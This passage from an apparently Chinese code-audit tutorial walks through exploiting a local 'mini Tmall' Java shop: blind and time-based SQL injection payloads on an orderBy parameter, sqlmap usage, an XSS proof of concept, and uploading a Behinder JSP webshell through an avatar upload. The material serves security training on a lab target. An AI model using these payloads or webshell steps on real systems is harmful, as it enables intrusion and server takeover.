<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 正常<br><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 错误<br></code></pre></td></tr></table></figure>

<ul>
<li>③、利用updatexml（更新选定XML片段的内容）</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 正确<br><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 错误<br></code></pre></td></tr></table></figure>

<ul>
<li>④、利用extractvalue（从目标XML中返回包含所查询值的字符串）</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user())) 正确<br><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user())) 错误<br></code></pre></td></tr></table></figure>

<ul>
<li>⑤、时间盲注</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) 正常响应时间<br><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) sleep <span class="hljs-number">2</span>秒<br></code></pre></td></tr></table></figure>



<h4 id="2-4-3、使用SQLmap"><a href="#2-4-3、使用SQLmap" class="headerlink" title="2.4.3、使用SQLmap"></a>2.4.3、使用SQLmap</h4><p>①、将数据包保存放入txt文件中，在orderBy参数处键入<code>*</code>，表示只对该地方进行探测注入。如下图所示：</p>
<p><img src="/img/r-txt.jpg" srcset="/img/loading.gif" lazyload alt="r-txt"></p>
<p>②、命令行进入SQLmap文件中，并键入命令：<code>python sqlmap.py -r txt文件地址</code>，如下图所示：</p>
<p><img src="/img/sqlmap-r.jpg" srcset="/img/loading.gif" lazyload alt="sqlmap-r"></p>
<p>③、回车，进行SQL注入攻击，最终得到结果如下：</p>
<p><img src="/img/SQLmap%E7%BB%93%E6%9E%9C.jpg" srcset="/img/loading.gif" lazyload alt="SQLmap结果"></p>
<p>在平时工作授权黑盒渗透测试时，对于Mybatis项目，可以多多关注不能使用<code>#&#123;&#125;</code>转义的场景，就比如上述<code>order by</code>语句。</p>
<h3 id="2-5、XSS漏洞验证"><a href="#2-5、XSS漏洞验证" class="headerlink" title="2.5、XSS漏洞验证"></a>2.5、XSS漏洞验证</h3><p><strong>管理后台 - 我的账户 - 管理员昵称处存在XSS漏洞。</strong></p>
<p>访问上述功能，在管理员昵称处键入XSS漏洞验证POC，<code>&lt;img src=1 onerror=alert(1) /&gt;</code>，点击保存。如下图所示：</p>
<p><img src="/img/%E7%AE%A1%E7%90%86%E5%91%98%E6%98%B5%E7%A7%B0%E4%BF%9D%E5%AD%98xss.png" srcset="/img/loading.gif" lazyload alt="管理员昵称保存xss"></p>
<p>触发XSS弹框，如下图所示：</p>
<p><img src="/img/xss%E6%BC%8F%E6%B4%9E%E5%BC%B9%E6%A1%861.jpg" srcset="/img/loading.gif" lazyload alt="xss漏洞弹框1"></p>
<p>其他地方，大家自由发挥。</p>
<h3 id="2-6、任意文件上传漏洞验证"><a href="#2-6、任意文件上传漏洞验证" class="headerlink" title="2.6、任意文件上传漏洞验证"></a>2.6、任意文件上传漏洞验证</h3><p>在代码审计阶段，我们确定了管理后台中管理员头像上传处存在任意文件上传漏洞。</p>
<p>我们从渗透测试角度对其进行漏洞验证。</p>
<p>工具涉及到BurpSuite和冰蝎（下载地址：<code>https://github.com/rebeyond/Behinder</code>，本课程文件夹中有该工具）</p>
<p>①、首先，访问<code>后台管理-我的账户</code>功能。并且打开BurpSuite，以及浏览器代理并指向BurpSuite地址。</p>
<p>②、点击管理员头像，选择任意图片进行上传。此时BurpSuite抓取到上传文件数据包，将其发送到Repeater模块，以备后续使用，数据包如下图所示：</p>
<p><img src="/img/%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%E5%8C%85.jpg" srcset="/img/loading.gif" lazyload alt="上传文件数据包"></p>
<p>③、修改filename后缀名为<code>.jsp</code>，并修改<code>Content-Type: text/plain</code>。将原先文件数据内容删除，并将冰蝎<code>server/shell.jsp</code>木马内容复制粘贴到上传数据包处后，点击发送数据包，获取到文件名字。如下图所示：</p>
<p><img src="/img/%E4%B8%8A%E4%BC%A0jsp%E6%9C%A8%E9%A9%AC.jpg" srcset="/img/loading.gif" lazyload alt="上传jsp木马"></p>
<p>④、从渗透测试角度进行分析，我们找一下文件URL路径。浏览器（我用的火狐，快捷键为F12）打开查看器，定位到图片，可以看到该图片的URL，如下图所示：</p>
<p><img src="/img/%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%9B%BE%E7%89%87url.jpg" srcset="/img/loading.gif" lazyload alt="定位到图片url"></p>
<p>⑤、既然知道了图片路径URL，将我们的木马拼凑一下，获得URL地址为：<code>http://127.0.0.1:8088/tmall/res/images/item/adminProfilePicture/464b8a45-841d-45fa-959f-08de37d034d7.jsp</code>。</p>
<p>⑥、打开冰蝎，右键新增，将URL地址粘贴进去，并键入密码（默认密码为：<code>rebeyond</code>），如下图所示：</p>
<p><img src="/img/%E6%96%B0%E5%A2%9E%E5%86%B0%E8%9D%8E.jpg" srcset="/img/loading.gif" lazyload alt="新增冰蝎"></p>
<p>⑦、点击保存后，网站列表多了我们新增加的地址，双击该地址，即可连接JSP木马，如下图所示：</p>
<p><img src="/img/%E8%BF%9E%E6%8E%A5JSP%E6%9C%A8%E9%A9%AC.jpg" srcset="/img/loading.gif" lazyload alt="连接JSP木马"></p>
<p>至此，任意文件上传漏洞验证完毕。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计</div>
      <div>http://example.com/2022/08/22/JavaWeb代码审计实战之迷你天猫商城系统详细分析版，实战应用级系统的Log4j2shell代码审计/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Power7089</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年8月22日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E6%9F%90RBAC%E7%B3%BB%E7%BB%9F%EF%BC%8C%E9%9D%9E%E5%B8%B8%E9%80%82%E5%90%88%E5%B0%8F%E7%99%BD%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0%E7%9A%84%E7%B3%BB%E7%BB%9F/" title="JavaWeb代码审计实战之某RBAC系统，非常适合小白入门练习的系统">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">JavaWeb代码审计实战之某RBAC系统，非常适合小白入门练习的系统</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       欢迎知识星球搜索【炼石计划@Java代码审计】【炼石计划@PHP代码审计】【炼石计划@渗透攻防宇宙】 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
